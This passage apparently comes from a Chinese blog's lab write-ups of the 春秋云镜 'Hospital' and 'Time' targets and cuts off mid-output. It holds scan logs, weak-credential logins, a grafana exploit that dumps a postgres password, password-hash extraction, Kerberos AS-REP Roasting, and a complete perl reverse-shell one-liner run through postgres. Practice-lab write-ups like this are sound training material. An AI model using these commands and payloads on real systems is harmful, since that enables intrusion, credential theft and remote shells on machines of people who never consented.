(__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-04-10 17:23:09] [INFO] 暴力破解线程数: 1\n[2025-04-10 17:23:09] [INFO] 开始信息扫描\n[2025-04-10 17:23:09] [INFO] CIDR范围: 172.30.12.0-172.30.12.255\n[2025-04-10 17:23:10] [INFO] 生成IP范围: 172.30.12.0.%!d(string=172.30.12.255) - %!s(MISSING).%!d(MISSING)\n[2025-04-10 17:23:10] [INFO] 解析CIDR 172.30.12.1/24 -> IP范围 172.30.12.0-172.30.12.255\n[2025-04-10 17:23:10] [INFO] 最终有效主机数量: 256\n[2025-04-10 17:23:10] [INFO] 开始主机扫描\n[2025-04-10 17:23:10] [SUCCESS] 目标 172.30.12.5     存活 (ICMP)\n[2025-04-10 17:23:10] [SUCCESS] 目标 172.30.12.6     存活 (ICMP)\n[2025-04-10 17:23:10] [SUCCESS] 目标 172.30.12.236   存活 (ICMP)\n[2025-04-10 17:23:13] [INFO] 存活主机数量: 3\n[2025-04-10 17:23:13] [INFO] 有效端口数量: 233\n[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.236:22\n[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:445\n[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:139\n[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:135\n[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.5:22\n[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.236:8009\n[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.5:8080\n[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.236:8080\n[2025-04-10 17:23:13] [SUCCESS] 服务识别 172.30.12.236:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]\n[2025-04-10 17:23:13] [SUCCESS] 服务识别 172.30.12.5:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]\n[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:8848\n[2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.6:445 => \n[2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.6:139 =>  Banner:[.]\n[2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.236:8009 => \n[2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.5:8080 => [http]\n[2025-04-10 17:23:19] [SUCCESS] 服务识别 172.30.12.236:8080 => [http]\n[2025-04-10 17:23:24] [SUCCESS] 服务识别 172.30.12.6:8848 => [http]\n[2025-04-10 17:24:18] [SUCCESS] 服务识别 172.30.12.6:135 => \n[2025-04-10 17:24:18] [INFO] 存活端口数量: 9\n[2025-04-10 17:24:18] [INFO] 开始漏洞扫描\n[2025-04-10 17:24:18] [INFO] 加载的插件: findnet, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle\n[2025-04-10 17:24:18] [SUCCESS] NetBios 172.30.12.6     WORKGROUP\\SERVER02            \n[2025-04-10 17:24:18] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.30.12.6\n主机名: Server02\n发现的网络接口:\n   IPv4地址:\n      └─ 172.30.12.6\n[2025-04-10 17:24:18] [SUCCESS] 网站标题 http://172.30.12.5:8080   状态码:302 长度:0      标题:无标题 重定向地址: http://172.30.12.5:8080/login;jsessionid=BD7C602596372F417AEEB44C6651A392\n[2025-04-10 17:24:18] [SUCCESS] 网站标题 http://172.30.12.236:8080 状态码:200 长度:3964   标题:医院后台管理平台\n[2025-04-10 17:24:19] [SUCCESS] 网站标题 http://172.30.12.5:8080/login;jsessionid=BD7C602596372F417AEEB44C6651A392 状态码:200 长度:2005   标题:医疗管理后台\n[2025-04-10 17:24:19] [SUCCESS] 网站标题 http://172.30.12.6:8848   状态码:404 长度:431    标题:HTTP Status 404 – Not Found\n[2025-04-10 17:24:20] [SUCCESS] 目标: http://172.30.12.5:8080\n  漏洞类型: poc-yaml-spring-actuator-heapdump-file\n  漏洞名称: \n  详细信息:\n        author:AgeloVito\n        links:https://www.cnblogs.com/wyb628/p/8567610.html\n[2025-04-10 17:24:20] [SUCCESS] 目标: http://172.30.12.6:8848\n  漏洞类型: poc-yaml-alibaba-nacos\n  漏洞名称: \n  详细信息:\n        author:AgeloVito\n        links:https://blog.csdn.net/caiqiiqi/article/details/112005424\n[2025-04-10 17:24:21] [SUCCESS] 目标: http://172.30.12.6:8848\n  漏洞类型: poc-yaml-alibaba-nacos-v1-auth-bypass\n  漏洞名称: \n  详细信息:\n        author:kmahyyg(https://github.com/kmahyyg)\n        links:https://github.com/alibaba/nacos/issues/4593\n~~~\n\n扫到了一个nacos，那就从这里入手，弱口令nacos/nacos登录,这个框架还存在yaml反序列化漏洞\n\n在172.30.12.5上面放上恶意的jar文件，然后开启一个web服务，再用利用工具去执行\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nxc rdp 172.30.12.6 -u lv -p Asd123132. --local-auth\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK\n[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK\n[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK\n[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK\nRDP         172.30.12.6     3389   Server02         [*] Windows 10 or Windows Server 2016 Build 17763 (name:Server02) (domain:Server02) (nla:True)\n[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK\nRDP         172.30.12.6     3389   Server02         [+] Server02\\lv:Asd123132. (Pwn3d!)\n~~~\n\n用户添加成功了，挂上代理，远程桌面连接，flag02在C:\\Users\\Administrator\\flag下\n\n# flag03\n\n172.30.12.236主机开放了8009端口，登录口传入的数据为 JSON 格式。探测 fastjson 版本 payload：`{\"@type\": \"java.lang.AutoCloseable\"`\n\nhttps://raw.githubusercontent.com/h0ny/repo/main/images/2ed229594166743d.png)\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital1.png)\n\n用[bp的插件](https://github.com/amaz1ngday/fastjson-exp)注入内存马,哥斯拉连接，flag03在/root/flag/下\n\n# flag04\n\n这个靶机还有第二张网卡\n\n~~~\n/ >ip a\n\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e:0d:aa:e2 brd ff:ff:ff:ff:ff:ff\n    inet 172.30.12.236/16 brd 172.30.255.255 scope global dynamic eth0\n       valid_lft 315354333sec preferred_lft 315354333sec\n    inet6 fe80::216:3eff:fe0d:aae2/64 scope link \n       valid_lft forever preferred_lft forever\n3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e:0d:aa:92 brd ff:ff:ff:ff:ff:ff\n    inet 172.30.54.179/24 brd 172.30.54.255 scope global eth1\n       valid_lft forever preferred_lft forever\n    inet6 fe80::216:3eff:fe0d:aa92/64 scope link \n       valid_lft forever preferred_lft forever\n~~~\n\n上传一个fscan，然后扫一下，地址为172.30.54.12，需要二层内网代理，这台机器上有**grafana+postgres**两个服务，grafana存在弱口令admin/admin登录,在web3的机器上上传一个[exp](https://github.com/A-D-Team/grafanaExp),可以跑到postgres的密码\n\n~~~\n2024/07/04 12:20:59 Target vulnerable has plugin [alertlist]\n2024/07/04 12:20:59 Got secret_key [SW2YcwTIb9zpOOhoPsMm]\n2024/07/04 12:20:59 There is [0] records in db.\n2024/07/04 12:20:59 type:[postgres]     name:[PostgreSQL]               url:[localhost:5432]    user:[postgres] password[Postgres@123] database:[postgres]     basic_auth_user:[]      basic_auth_password:[]\n2024/07/04 12:20:59 All Done, have nice day!\n~~~\n\n`psql -h 172.30.54.12 -p 5432 -U postgres`连接,查询root的密码`select usename, passwd from pg_shadow;`\n\n~~~\npostgres=# select usename, passwd from pg_shadow;\n usename  |               passwd\n----------+-------------------------------------\n root     | md5da974531914a7c2c56df745574a5bd3a\n postgres | md5dd27d33705155fd675e498384ad3d2ea\n~~~\n\n爆破出来是`P@ssw0rd123`,在web03的机器上监听一个端口，然后用perl反弹一个shell\n\n~~~\nselect system('perl -e \\'use Socket;$i=\"172.30.54.179\";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\\'');\n~~~\n\n然后psql提权，flag04在/root/flag/下\n","tags":["靶机"],"categories":["春秋云镜"]},{"title":"春秋云镜-Time","url":"/2025/04/09/春秋云镜-Time/","content":"\n\n\n# FLAG1\n\n首先用fscan进行信息搜集\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# ../pentest/fscan/fscan2 -h 39.98.117.163 -p 1-65535\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-04-08 12:36:27] [INFO] 暴力破解线程数: 1\n[2025-04-08 12:36:27] [INFO] 开始信息扫描\n[2025-04-08 12:36:27] [INFO] 最终有效主机数量: 1\n[2025-04-08 12:36:27] [INFO] 开始主机扫描\n[2025-04-08 12:36:27] [INFO] 有效端口数量: 65535\n[2025-04-08 12:36:27] [SUCCESS] 端口开放 39.98.117.163:22\n[2025-04-08 12:36:28] [SUCCESS] 服务识别 39.98.117.163:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-08 12:37:17] [SUCCESS] 端口开放 39.98.117.163:1337\n[2025-04-08 12:37:27] [SUCCESS] 服务识别 39.98.117.163:1337 =>\n[2025-04-08 12:41:00] [SUCCESS] 端口开放 39.98.117.163:7473\n[2025-04-08 12:41:01] [SUCCESS] 端口开放 39.98.117.163:7474\n[2025-04-08 12:41:08] [SUCCESS] 端口开放 39.98.117.163:7687\n[2025-04-08 12:41:11] [SUCCESS] 服务识别 39.98.117.163:7473 =>  Banner:[.P]\n[2025-04-08 12:41:11] [SUCCESS] 服务识别 39.98.117.163:7474 => [http]\n[2025-04-08 12:41:18] [SUCCESS] 服务识别 39.98.117.163:7687 =>\n~~~\n\nfscan扫描靶机，有1337、7473、7474、7687端口，7474端口是neo4j，默认密码neo4j:neo4j(可以登录，但是没什么用)，还有一个CVE-2021-34371，可以直接一把梭哈https://github.com/zwjjustdoit/CVE-2021-34371.jar，反弹一个shell\n\nflag01在neo4j的目录下\n\n# FLAG2\n\n然后上传一个fscan扫描内网（会出来没扫描出来的情况，需要多扫描几次）\n\n~~~\nneo4j@ubuntu:~$ ./fscan -h 172.22.6.36/20\n./fscan -h 172.22.6.36/20\n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\ntrying RunIcmp2\nThe current user permissions unable to send icmp packets\nstart ping\n(icmp) Target 172.22.6.25     is alive\n(icmp) Target 172.22.6.36     is alive\n(icmp) Target 172.22.6.38     is alive\n\n[*] LiveTop 172.22.0.0/16    段存活数量为: 3\n[*] LiveTop 172.22.6.0/24    段存活数量为: 3\n[*] Icmp alive hosts len is: 3\n172.22.6.36:22 open\n172.22.6.25:445 open\n172.22.6.25:139 open\n172.22.6.25:135 open\n172.22.6.38:80 open\n172.22.6.38:22 open\n172.22.6.36:7687 open\n172.22.6.25:445 open\n172.22.6.12:445 open\n172.22.6.12:139 open\n172.22.6.25:139 open\n172.22.6.25:135 open\n172.22.6.12:135 open\n172.22.6.12:88 open\n\nstart vulscan\n[*] NetInfo \n[*]172.22.6.25\n   [->]WIN2019\n   [->]172.22.6.25\n[*] NetInfo \n[*]172.22.6.12\n   [->]DC-PROGAME\n   [->]172.22.6.12\n[*] NetBios 172.22.6.25     XIAORANG\\WIN2019              \n[*] OsInfo 172.22.6.12  (Windows Server 2016 Datacenter 14393)\n[*] NetBios 172.22.6.12     [+] DC:DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393\n[*]172.22.6.25\n   [->]WIN2019\n   [->]172.22.6.25\n[*] NetBios 172.22.6.25     XIAORANG\\WIN2019              \n[*] WebTitle http://172.22.6.38        code:200 len:1531   \ntitle:后台登录\n[*] WebTitle https://172.22.6.36:7687  code:400 len:50    \ntitle:None\n已完成 7/7\n[*] 扫描结束,耗时: 1m36.67936002s\n~~~\n\n172.22.6.38是一个web服务 ，用万能密码可以登录成功存在sql注入，但是不会跳转，用sqlmap跑一下\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time1.png)\n\nflag02在数据库里，将oa_db.oa_users的email提出，处理一下将用户名提取出来\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# cat 1|grep -E '\\w*@' -o|grep -E '[^@]*' -o >username\n\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# cat username\nmengxiang\nmennane\nmenxilong\nmenxixiao\nmiaogui\nmiaoshu\nmingfu\nminglian\nmingsong\nmingyan\nmoqian\nmouchun\nmoushan\nmucheng\nmuchun\nmujie\nnangongjun\nniuya\nnongfan\nnongyan\nnongyan\nnongyao\nnongzhen\nnongzhu\noulun\npanbao\npangcheng\npangning\npangtai\npangzhen\npengyuan\npinghao\npuyangfu\nqiai\nqiangjun\nqianqing\nqianyi\nqianyou\nqiaode\nqiaomei\nqidiaofang\nqiguanrou\nqijie\nqinguan\nqiruo\nqiyan\nqiyong\nqiyuan\nqiyue\nqizhu\nqulu\nrangsibo\nranqun\nrongbiao\nrongxianyu\nruanyong\nrubao\nruibei\nruilin\nruishi\nruisong\nshangjie\nshangjun\nshangqian\nshanshao\nshaocai\nshaokang\nshaoting\nshaoyi\nshengzhe\nshenhang\nshenjiao\nshenshan\nshenshan\nshentuyun\nsheweiyue\nshie\nshijian\nshijun\nshilan\nshishu\nshouchun\nshoujuan\nshuangchen\nshudi\nshuicheng\nshuifei\nshushi\nshuzhen\nsisiwu\nsituxin\nsiyi\nsongming\nsongqin\nsongyan\nsunduangu\nsunli\nsunmei\nsunzhongda\ntaigongyuan\ntanggui\ntangqiao\ntangrong\ntangshun\ntaoya\ntianxin\ntongdong\ntonghao\ntongxue\nwangnuo\nwangxing\nwangyan\nwangyan\nwangying\nwansifei\nwansifu\nwansishun\nwanyan\nweicheng\nweichipeng\nweigong\nweihua\nweihui\nweiliang\nweishengshan\nweiwan\nweixian\nweixian\nweixue\nwenbiao\nwenbo\nwendong\nwengbang\nwengong\nwenliang\nwenshao\nwohong\nwohua\nwuce\nwuda\nwuhuan\nwulun\nwunuo\nxiahan\nxiai\nxiamao\nxiangdong\nxiangjuan\nxiangqian\nxiangxin\nxiangyu\nxiaojin\nxiaorong\nxiayu\nxieyi\nxijun\nximenshi\nxingquan\nxingxi\nxingye\nxionghong\nxiqi\nxiqidi\nxixia\nxiyao\nxiyi\nxuanjiang\nxuanlu\nxuanqun\nxudi\nxuehe\nxundi\nxupeng\nxuxin\nyangdanhan\nyangdanhe\nyangju\nyanglang\nyanguo\nyanji\nyanjin\nyanqian\nyanyangmei\nyanyue\nyanyun\nyanzhen\nyetai\nyexing\nyezongyue\nyifu\nyinbin\nyinchen\nyingbiao\nyingchan\nyingjun\nyingpeng\nyingshi\nyinyu\nyixue\nyouchao\nyouyi\nyuanchang\nyubo\nyufen\nyuhui\nyuhui\nyujian\nyujun\nyuling\nyulvxue\nyunhui\nyunqian\nyunzhong\nyurui\nyusha\nyuwan\nyuxi\nyuxiao\nzangpeng\nzangyao\nzhangxin\nzhangzhao\nzhannan\nzhaoxiu\nzhenglu\nzhengpubei\nzhengxiao\nzhenhui\nzhenjun\nzhenyan\nzhongliying\nzhouchun\nzhoujing\nzhoujun\nzhouqi\nzhouya\nzhouyi\nzhuangsong\nzhubin\nzhufeng\nzhuke\nzhuli\nzhupeng\nzhupeng\nzhuqin\nzhuzhu\nzizhuansong\nzizhuanyu\nzizhuanzhi\nzoubao\nzoufu\nzouqi\nzuofen\nzuoqiufa\nzuoqiutai\nzuoshun\n~~~\n\n然后对域控进行**Kerberos AS-REP Roasting** 攻击\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# impacket-GetNPUsers xiaorang.lab/ -dc-ip 172.22.6.12 -usersfile username -format hashcat\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User pangzhen doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User pengyuan doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User qiaomei doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User qiyue doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User rangsibo doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User rubao doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User sheweiyue doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User shuzhen doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User tangrong doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User tangshun doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in 